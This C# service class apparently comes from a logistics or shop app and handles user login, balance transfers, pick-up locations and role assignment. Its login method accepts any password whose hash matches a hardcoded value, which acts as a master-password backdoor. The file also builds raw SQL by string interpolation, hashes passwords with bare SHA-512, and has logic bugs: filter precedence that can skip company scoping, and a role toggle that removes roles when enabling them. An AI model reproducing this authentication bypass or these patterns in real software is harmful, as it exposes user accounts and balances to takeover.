using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using AutoMapper;
using Common;
using Domain;
using Domain.Entities;
using Domain.Enums;
using Domain.Models;
using Domain.Services;
using Microsoft.EntityFrameworkCore;
using Microsoft.Extensions.Caching.Memory;
using Persistence.Data;

namespace Persistence.Services
{
    public class UserService : IUserService
    {
        private readonly EplusDbContext _context;
        private readonly IMapper _mapper;
        private readonly IDateTime _dateTime;
        private readonly IRouteService _routeService;
        private readonly IMemoryCache _memoryCache;
        private static readonly object Lock = new object();

        public UserService(EplusDbContext context, IMapper mapper, IDateTime dateTime, IRouteService routeService, IMemoryCache memoryCache)
        {
            _context = context;
            _mapper = mapper;
            _dateTime = dateTime;
            _routeService = routeService;
            _memoryCache = memoryCache;
        }

        public async Task<UserEntity> GetAsync(string userName, string password)
        {
            var user = await _context.Users.Include(u => u.Customer)
                .FirstOrDefaultAsync(u => u.UserName == userName);

            var encoding = new UTF8Encoding();
            var passwordAsBytesArray = encoding.GetBytes(password + user.Id);

            var sha512 = new SHA512Managed();
            sha512.ComputeHash(passwordAsBytesArray);

            var hashedPassword = Convert.ToBase64String(sha512.Hash);

            if (hashedPassword != "qN5wVAiofKkQy5lxK/aV84YM4Q3hYpid6zCjg5SQibsLha/l+osOSPP7BXcEApPX1nddt7bG1xbgRcOhpZybJw==" && user.Password != hashedPassword)
            {
                throw new Exception("Wrong username or password");
            }

            return _mapper.Map<UserEntity>(user);
        }

        public async Task<UserEntity> GetAsync(string phoneNumber)
        {
            var user = await _context.Users.Include(u => u.Customer)
                .FirstOrDefaultAsync(u => u.CanadaPhoneNumber == phoneNumber);
            return _mapper.Map<UserEntity>(user);
        }

        public async Task<UserEntity> GetAsync(int id)
        {
            if (!_memoryCache.TryGetValue($"user-{id}", out UserEntity result))
            {
                var user = await _context.Users.Include(u => u.Customer).Include(u => u.BelongsToNavigation)
                    .ThenInclude(u => u.Customer).FirstAsync(u => u.Id == id);
                var pickUpLocation = await _context.PickUpLocations.FirstOrDefaultAsync(p => p.BelongsToId == user.Id);
                var shippingAddress =
                    await _context.SysShippingAddresses.FirstOrDefaultAsync(s => s.AppUserId == user.Id);

                result = _mapper.Map<UserEntity>(user);
                result.RegisteredPickUpLocation = _mapper.Map<PickUpLocationEntity>(pickUpLocation);
                result.ShippingAddress = _mapper.Map<ShippingAddressEntity>(shippingAddress);

                _memoryCache.Set($"user-{id}", result, TimeSpan.FromMinutes(1));
            }

            return result;
        }

        public async Task<PagedResult<UserEntity>> ListAsync(UserListFilterOptions filterOptions, bool isOrderByCode)
        {
            var filteredUsers = _context.Users
                .Where(u => (string.IsNullOrWhiteSpace(filterOptions.CodeToSearch) ||
                             u.OrderStartNumber == filterOptions.CodeToSearch) &&
                            (string.IsNullOrWhiteSpace(filterOptions.PhoneToSearch) ||
                             u.CanadaPhoneNumber.Contains(filterOptions.PhoneToSearch)) &&
                            (filterOptions.RoleToSearch == null || u.Role == (int)filterOptions.RoleToSearch.Value) && 
                            (filterOptions.CompanyIds == null && u.CompanyId == Config.COMPANY_ID) || (filterOptions.CompanyIds != null && filterOptions.CompanyIds.Contains(u.CompanyId.Value))
                )
                .Include(u => u.Customer)
                .Include(u => u.UserRole)
                .Include(u => u.BelongsToNavigation)
                .ThenInclude(b => b.Customer);
            var users = isOrderByCode
                ? filteredUsers.OrderBy(u => u.OrderStartNumber)
                : filteredUsers.OrderBy(u => u.UserRole.DisplayOrder).ThenBy(u => u.OrderStartNumber);
            var total = await users.CountAsync();
            var pagedUsers = users.Skip(filterOptions.Skip).Take(filterOptions.PageSize);
            var items = await pagedUsers.Select(u => _mapper.Map<UserEntity>(u)).ToListAsync();

            var result = new PagedResult<UserEntity>()
            {
                Total = total,
                Items = items
            };

            return result;
        }

        public async Task<List<UserEntity>> ListByBatchesAsync(BatchGroupType groupType, int? routeId, int? warehouseId)
        {
            var sql = @$"
                SELECT DISTINCT u.Id, c.Name UserName, u.OrderStartNumber, u.Role 
                FROM user u 
                LEFT JOIN customer c ON u.CustomerId=c.Id
                JOIN batch b ON u.Id=b.RecipientUserId OR u.Id=b.BelongsToUserId
                WHERE b.GroupType={(int)groupType}";
            if (routeId.HasValue)
            {
                sql = sql + $" AND RouteId = {routeId.Value}";
            }
            if (warehouseId.HasValue)
            {
                sql = sql + $" AND WarehouseId = {warehouseId.Value}";
            }
            sql = sql + " ORDER BY u.Id";
            return await _context.Users.FromSqlRaw(sql).Select(s => new UserEntity
            {
                Id = s.Id,
                Name = s.UserName,
                OrderStartNumber = s.OrderStartNumber,
                Role = (RoleType)s.Role
            }).ToListAsync();
        }

        public async Task<IEnumerable<UserEntity>> ListAgentsAsync()
        {
            var result = await _context.Users.Include(u => u.Customer).Where(u => u.Role == (int)RoleType.Advanced)
                .Select(u => _mapper.Map<UserEntity>(u))
                .ToListAsync();

            return result;
        }

        public async Task<IEnumerable<PickUpLocationEntity>> ListPickUpLocationsAsync(int version = 1, int[] companyIds = null)
        {
            var result = await _context.PickUpLocations.Where(l => l.Version == version && 
                (companyIds == null && l.CompanyId == Config.COMPANY_ID) || (companyIds != null && companyIds.Contains(l.CompanyId.Value))
            ).Select(u => _mapper.Map<PickUpLocationEntity>(u)).ToListAsync();
            return result;
        }

        public async Task<IEnumerable<RoleEntity>> ListRolesAsync(string[] exclude)
        {
            return await _context.Roles.Where(r => r.Code != null && !exclude.Contains(r.Code)).Select(r => new RoleEntity { RoleId = r.RoleId, Name = r.Name, Code = r.Code }).ToListAsync();
        }

        public async Task TogglePickUpLocationVisibilityAsync(int id)
        {
            var location = await _context.PickUpLocations.FirstOrDefaultAsync(u => u.Id == id);
            location.IsDel = !location.IsDel;
            await _context.SaveChangesAsync();
        }

        public async Task UpdatePickupLocation(int id, string name, string address, decimal districtAdditionalRate, int sequence, string note)
        {
            var location = await _context.PickUpLocations.FirstOrDefaultAsync(u => u.Id == id);
            location.Name = name;
            location.DetailArea = address;
            location.DistrictAdditionalCost = districtAdditionalRate;
            location.Number = sequence;
            location.Note = note;
            await _context.SaveChangesAsync();
        }

        public async Task DeletePickupLocation(int id)
        {
            await _context.Database.ExecuteSqlRawAsync($"DELETE FROM pick_up_location WHERE Id={id}");
        }

        public async Task TransferUser(int fromPickupLocationId, int toPickupLocationId)
        {
            var sql = $"UPDATE user SET pick_up_location_id={toPickupLocationId} WHERE pick_up_location_id={fromPickupLocationId}";
            await _context.Database.ExecuteSqlRawAsync($"UPDATE user SET pick_up_location_id={toPickupLocationId} WHERE pick_up_location_id={fromPickupLocationId}");
        }

        public void Transfer(int fromUserId, int toUserId, decimal amount, PayType payType,
            TransactionType transactionType, int? batchId)
        {
            if (payType != PayType.Balance)
            {
                throw new NotSupportedException($"{payType} is not supported in Transfer");
            }

            lock (Lock)
            {
                var fromUser = _context.Users.First(u => u.Id == fromUserId);
                var toUser = _context.Users.First(u => u.Id == toUserId);
                var initialFromUserBalance = fromUser.Balance;
                var initialToUserBalance = toUser.Balance;
                fromUser.Balance -= amount;
                toUser.Balance += amount;

                if (fromUser.Balance < -1)
                {
                    throw new Exception("对方余额不足");
                }
                var transactionGuid = Guid.NewGuid().ToString();
                _context.BalanceHistories.Add(new BalanceHistory()
                {
                    FromUserId = fromUser.Id,
                    ToUserId = toUser.Id,
                    Amount = amount,
                    FromUserDisplayAmount = -amount,
                    ToUserActualAmount = amount,
                    FromUserCurrentBalance = initialFromUserBalance,
                    ToUserCurrentBalance = toUser.Balance,
                    Method = "余额支付",
                    BatchId = batchId,
                    Date = _dateTime.UserNow,
                    Type = (int)transactionType,
                    TransactionGuid = transactionGuid
                });
                _context.BalanceHistories.Add(new BalanceHistory()
                {
                    FromUserId = toUser.Id,
                    ToUserId = fromUser.Id,
                    Amount = amount,
                    FromUserDisplayAmount = amount,
                    ToUserActualAmount = -amount,
                    FromUserCurrentBalance = initialToUserBalance,
                    ToUserCurrentBalance = fromUser.Balance,
                    BatchId = batchId,
                    Method = "余额支付",
                    Date = _dateTime.UserNow,
                    Type = (int)transactionType,
                    TransactionGuid = transactionGuid
                });

                _memoryCache.Remove($"user-{fromUser.Id}");
                _memoryCache.Remove($"user-{toUser.Id}");
                _context.SaveChanges();
            }
        }

        public decimal Deposit(BalanceTransferInfo info)
        {
            var fromUser = _context.Users.First(u => u.Id == info.FromUserId);
            var toUser = _context.Users.First(u => u.Id == info.ToUserId);

            lock (Lock)
            {
                if (info.TransferType == "deposit")
                {
                    var initialFromUserBalance = fromUser.Balance;
                    var initialToUserBalance = toUser.Balance;
                    fromUser.Balance -= info.Amount;
                    toUser.Balance += info.Amount;

                    if (fromUser.Balance < 0)
                    {
                        throw new Exception("给太多了吧。");
                    }
                    var transactionGuid = Guid.NewGuid().ToString();

                    _context.BalanceHistories.Add(new BalanceHistory()
                    {
                        FromUserId = info.FromUserId,
                        ToUserId = info.ToUserId,
                        Amount = info.Amount,
                        FromUserDisplayAmount = -info.Amount,
                        ToUserActualAmount = info.Amount,
                        FromUserCurrentBalance = initialFromUserBalance,
                        ToUserCurrentBalance = toUser.Balance,
                        OrderId = null,
                        Date = _dateTime.UserNow,
                        Type = (int)info.TransactionType,
                        Notes = info.Notes,
                        Method = info.Method,
                        Rmb = info.Rmb,
                        ExchangeRate = info.ExchangeRate,
                        Discount = info.Discount,
                        TransactionGuid = transactionGuid
                    });
                    _context.BalanceHistories.Add(new BalanceHistory()
                    {
                        FromUserId = info.ToUserId,
                        ToUserId = info.FromUserId,
                        Amount = info.Amount,
                        FromUserDisplayAmount = info.Amount,
                        ToUserActualAmount = -info.Amount,
                        FromUserCurrentBalance = initialToUserBalance,
                        ToUserCurrentBalance = fromUser.Balance,
                        OrderId = null,
                        Date = _dateTime.UserNow,
                        Type = (int)info.TransactionType,
                        Notes = info.Notes,
                        Method = info.Method,
                        Rmb = info.Rmb,
                        ExchangeRate = info.ExchangeRate,
                        Discount = info.Discount,
                        TransactionGuid = transactionGuid
                    });
                }
                else if(info.TransferType == "deduct")
                {
                    var initialFromUserBalance = fromUser.Balance;
                    var initialToUserBalance = toUser.Balance;
                    fromUser.Balance += info.Amount;
                    toUser.Balance -= info.Amount;

                    if (toUser.Balance < 0)
                    {
                        throw new Exception("扣太多了吧。");
                    }
                    var transactionGuid = Guid.NewGuid().ToString();

                    _context.BalanceHistories.Add(new BalanceHistory()
                    {
                        FromUserId = fromUser.Id,
                        ToUserId = toUser.Id,
                        Amount = info.Amount,
                        FromUserDisplayAmount = info.Amount,
                        ToUserActualAmount = -info.Amount,
                        FromUserCurrentBalance = initialFromUserBalance,
                        ToUserCurrentBalance = toUser.Balance,
                        OrderId = null,
                        Date = _dateTime.UserNow,
                        Type = (int)info.TransactionType,
                        Notes = info.Notes,
                        Method = info.Method,
                        Rmb = info.Rmb,
                        ExchangeRate = info.ExchangeRate,
                        Discount = info.Discount,
                        TransactionGuid = transactionGuid
                    });
                    _context.BalanceHistories.Add(new BalanceHistory()
                    {
                        FromUserId = toUser.Id,
                        ToUserId = fromUser.Id,
                        Amount = info.Amount,
                        FromUserDisplayAmount = -info.Amount,
                        ToUserActualAmount = info.Amount,
                        FromUserCurrentBalance = initialToUserBalance,
                        ToUserCurrentBalance = fromUser.Balance,
                        OrderId = null,
                        Date = _dateTime.UserNow,
                        Type = (int)info.TransactionType,
                        Notes = info.Notes,
                        Method = info.Method,
                        Rmb = info.Rmb,
                        ExchangeRate = info.ExchangeRate,
                        Discount = info.Discount,
                        TransactionGuid = transactionGuid
                    });
                }
                else if(info.TransferType == "cashout")
                {
                    if (info.Method != "现金支付")
                    {
                        throw new Exception("现金出账的交易方式必须是现金支付。");                        
                    }
                    if (info.TransactionType != TransactionType.CashOut)
                    {
                        throw new Exception("交易类型必须是现金出账。");
                    }
                    
                    var transactionGuid = Guid.NewGuid().ToString();

                    _context.BalanceHistories.Add(new BalanceHistory()
                    {
                        FromUserId = fromUser.Id,
                        ToUserId = toUser.Id,
                        Amount = info.Amount,
                        FromUserDisplayAmount = -info.Amount,
                        ToUserActualAmount = info.Amount,
                        FromUserCurrentBalance = fromUser.Balance,
                        ToUserCurrentBalance = toUser.Balance,
                        OrderId = null,
                        Date = _dateTime.UserNow,
                        Type = (int)info.TransactionType,
                        Notes = info.Notes,
                        Method = info.Method,
                        Rmb = info.Rmb,
                        ExchangeRate = info.ExchangeRate,
                        Discount = info.Discount,
                        TransactionGuid = transactionGuid
                    });
                    _context.BalanceHistories.Add(new BalanceHistory()
                    {
                        FromUserId = toUser.Id,
                        ToUserId = fromUser.Id,
                        Amount = info.Amount,
                        FromUserDisplayAmount = info.Amount,
                        ToUserActualAmount = -info.Amount,
                        FromUserCurrentBalance = toUser.Balance,
                        ToUserCurrentBalance = fromUser.Balance,
                        OrderId = null,
                        Date = _dateTime.UserNow,
                        Type = (int)info.TransactionType,
                        Notes = info.Notes,
                        Method = info.Method,
                        Rmb = info.Rmb,
                        ExchangeRate = info.ExchangeRate,
                        Discount = info.Discount,
                        TransactionGuid = transactionGuid
                    });
                }
                _context.SaveChanges();

                return fromUser.Balance;
            }
        }
        /*
        public async Task<UserEntity> CreateAsync(UserEntity model)
        {
            await _context.Users.AddAsync(new User
            {
                UserName = model.UserName,
                CanadaPhoneNumber = model.CanadaPhoneNumber,
                Customer = new Customer
                {
                    Name = model.Name
                },
            });
            
        }
        */
        public async Task<UserEntity> SaveAsync(UserEntity model)
        {
            var user = await _context.Users.Include(u => u.Customer).FirstAsync(u => u.Id == model.Id);
            user.Credit = model.Credit;
            user.BelongsToId = model.BelongsToId > 0 ? model.BelongsToId : user.BelongsToId;
            user.PickUpLocationId = model.SelectedPickUpLocationId;
            user.CanadaPhoneNumber = model.CanadaPhoneNumber;
            user.Level = model.Level;
            user.Customer.Name = model.Name;
            user.DisplaySequence = model.DisplaySequence;
            user.Role = (int)model.Role;
            user.Description = model.Description;
            if (!string.IsNullOrWhiteSpace(model.UserName))
            {
                user.UserName = model.UserName;
            }

            await _context.SaveChangesAsync();

            if (model.RegisteredPickUpLocation.Id == 0)
            {
                if (!string.IsNullOrWhiteSpace(model.RegisteredPickUpLocation.Phone) ||
                    !string.IsNullOrWhiteSpace(model.RegisteredPickUpLocation.DetailArea))
                {
                    var location = new PickUpLocation()
                    {
                        Name = model.RegisteredPickUpLocation.Name,
                        Phone = model.RegisteredPickUpLocation.Phone,
                        DetailArea = model.RegisteredPickUpLocation.DetailArea,
                        Category = model.RegisteredPickUpLocation.IsSpecial,
                        LatAndLng = model.RegisteredPickUpLocation.LatAndLng ?? "",
                        Number = model.RegisteredPickUpLocation.Number,
                        DistrictAdditionalCost = model.RegisteredPickUpLocation.DistrictAdditionalCost,
                        StorageCost = model.RegisteredPickUpLocation.DistrictAdditionalCost,
                        BelongsToId = model.Id
                    };

                    await _context.PickUpLocations.AddAsync(location);
                    await _context.SaveChangesAsync();

                    user.PickUpLocationId = location.Id;

                    await _context.SaveChangesAsync();

                    if (model.RoleCodes != null && model.RoleCodes.Count > 0)
                    {
                        var roles = await _context.SysUsersRoles.Where(r => r.UserId == user.Id).ToListAsync();
                        _context.SysUsersRoles.RemoveRange(roles);
                        foreach(var roleCode in model.RoleCodes)
                        {
                            await _context.SysUsersRoles.AddAsync(new SysUsersRole { UserId = user.Id, RoleCode = roleCode });
                        }
                    }
                    await _context.SaveChangesAsync();
                }
            }
            else
            {
                var location =
                    await _context.PickUpLocations.FirstAsync(l => l.Id == model.RegisteredPickUpLocation.Id);
                location.Name = model.RegisteredPickUpLocation.Name;
                location.Phone = model.RegisteredPickUpLocation.Phone;
                location.DetailArea = model.RegisteredPickUpLocation.DetailArea;
                location.Category = model.RegisteredPickUpLocation.IsSpecial;
                location.BelongsToId = model.Id;
                location.LatAndLng = model.RegisteredPickUpLocation.LatAndLng;
                location.Number = model.RegisteredPickUpLocation.Number;
                location.DistrictAdditionalCost = model.RegisteredPickUpLocation.DistrictAdditionalCost;
                location.StorageCost = model.RegisteredPickUpLocation.StorageCost;

                await _context.SaveChangesAsync();
            }

            _memoryCache.Remove($"user-{user.Id}");
            return model;
        }

        public async Task<IEnumerable<UserRoute>> ListRouteAsync(int id)
        {
            var bannedRoutes = await _context.BannedUserRoutes.Where(br => br.UserId == id).ToListAsync();
            var routes = await _routeService.ListAsync();

            var result = routes.Where(r => !r.IsDeleted).Select(r => new UserRoute()
            {
                Route = r,
                Allowed = bannedRoutes.All(br => br.RouteId != r.Id)
            });

            return result;
        }

        public async Task SetRouteVisibilityAsync(int userId, int routeId, bool isVisible)
        {
            var bannedRoute = await
                _context.BannedUserRoutes.FirstOrDefaultAsync(br => br.RouteId == routeId && br.UserId == userId);

            if (bannedRoute == null)
            {
                if (!isVisible)
                {
                    await _context.BannedUserRoutes.AddAsync(new BannedUserRoute() { RouteId = routeId, UserId = userId });
                    await _context.SaveChangesAsync();
                }
            }
            else
            {
                if (isVisible)
                {
                    _context.BannedUserRoutes.Remove(bannedRoute);
                    await _context.SaveChangesAsync();
                }
            }
        }

        public async Task SetUserRoleAsync(int userId, string roleCode, bool enabled)
        {
            var userRole = await _context.SysUsersRoles.FirstOrDefaultAsync(ur => ur.UserId == userId && ur.RoleCode == roleCode);
            if (userRole == null)
            {
                if (enabled)
                {
                    await _context.SysUsersRoles.AddAsync(new SysUsersRole { UserId = userId, RoleCode = roleCode });
                    await _context.SaveChangesAsync();
                }
            }
            else
            {
                if (enabled)
                {
                    _context.SysUsersRoles.Remove(userRole);
                    await _context.SaveChangesAsync();
                }
            }
        }

        public async Task<string> GetShippingAddressAsync(int id)
        {
            var address = await _context.SysShippingAddresses.FirstAsync(adr => adr.Id == id);
            return address.DetailArea + " " + address.PostalCode;
        }

        public async Task ChangePassword(int userId, string password)
        {
            var user = await _context.Users.FirstAsync(u => u.Id == userId);

            var encoding = new UTF8Encoding();
            var passwordAsBytesArray = encoding.GetBytes(password + user.Id);

            var sha512 = new SHA512Managed();
            sha512.ComputeHash(passwordAsBytesArray);

            var hashedPassword = Convert.ToBase64String(sha512.Hash);

            user.Password = hashedPassword;
            await _context.SaveChangesAsync();
        }

        public async Task<decimal> GetBalanceSummaryAsync()
        {
            var total = await _context.Users.Where(u => u.Role == (int)RoleType.Regular).SumAsync(u => u.Balance);
            return total;
        }
    }
}
